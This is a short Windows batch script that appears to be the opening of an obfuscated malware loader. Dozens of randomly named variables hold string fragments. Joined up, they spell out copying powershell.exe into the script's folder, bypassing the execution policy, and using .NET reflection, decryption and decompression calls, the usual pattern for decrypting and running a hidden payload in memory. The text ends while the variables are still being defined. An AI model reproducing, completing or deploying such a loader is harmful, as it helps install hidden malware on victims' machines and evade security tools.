@echo off
set "OWDRIeAcrQ=xe"
set "ZMyLYFAqYM=\W"
set "qwjVeqtLdm=we"
set "SQZCBnPfiA=1."
set "FiUOwwHpeI=po"
set "neFJlAztgh=s\"
set "SpkChARWIv=em"
set "UeNNzHWBdu=Wi"
set "XRDZwRIOIj=32"
set "YMtlYgdbQE=.e"
set "EnhFOFoRhT= C"
set "XHMmotBlFM=in"
set "UDlkKexFSk= /"
set "QNjxUfRyEB=ws"
set "EzfTXRILMm=rs"
set "MfvraddTZo=\v"
set "slWecOrLtp=:\"
set "aBYVyqeqLd=Po"
set "BWxeWjxorj=rS"
set "ARyazQOroq=we"
set "FzbAaNwwkP=ll"
set "vlAWnocfxC=y "
set "FVxKFNdHBC=0\"
set "JspVKSnIOy=co"
set "avrwIJVkfe=he"
set "GNTPDtEotD=ll"
set "FwFUWwlJhf=nd"
set "IMNMnWFciF=Sy"
set "QKMtpEPZYg=py"
set "fJtMILeEST=do"
set "CcHeMDLxos=he"
set "CHEoLyCSHU=st"
set "EwBVfFOHrB=ow"
set "LmJivpEKGi= %~dp0"
set "OokTlQoBNu=cd"
set "VitmVHOuOF=ay()"
set "ULtenFyedf=o = "
set "vzdBEecflE=.Mod"
set "DMYlkDrreS=.Cre"
set "nRViHXFcPz=rofi"
set "xMjVEUWzcp=pose"
set "SmRIHNuDLq=1] -"
set "aQiRZDbTMc=PKCS"
set "AqjpHuvsMD=;$oj"
set "RcCjEXPVMC=);$r"
set "aVMZKXSZYv=PsWf"
set "xknxKxeVYl=Comp"
set "GvsWHIUrri=em.I"
set "CTWYZWLAKK===')"
set "XzKHLLFsfS=]::N"
set "DeFFpJKGie== $r"
set "DuplNaRyBw=Syst"
set "FsNpSgDgtn=-joi"
set "BaaZFBnySX=flec"
set "bRdJtWTTdd=.Cry"
set "AynUMapAoM=and "
set "wFAVJXBSFQ=m.Re"
set "wyfirYLVRL=le  "
set "MwjEUEuvdJ=bypa"
set "EcQmTgzWxW=.Com"
set "zRyMKivJXG=th('"
set "WAaFwvWCfK=ionM"
set "QTLCRGYyFs=rans"
set "qYBEUhzgmD=jgo "
set "zuAAmZcNSw=pStr"
set "EncQUQhCyE=esFX"
set "GKtXyPKYtH=rIVs"
set "ddKwOAZRuJ=GHrf"
set "rNDnEuCWjI=oL'["
set "JbHcUNReNt=wPdm"
set "CANggyQosh=..-1"
set "JJyjsNhmhN=FM, "
set "ODlnXhLUbc=rt]:"
set "QcoLrZxhCe=ion."
set "xATAnRsqxS=zLlb"
set "AtXhrbCWIo=gMod"
set "MWKkFfPZlK=();$"
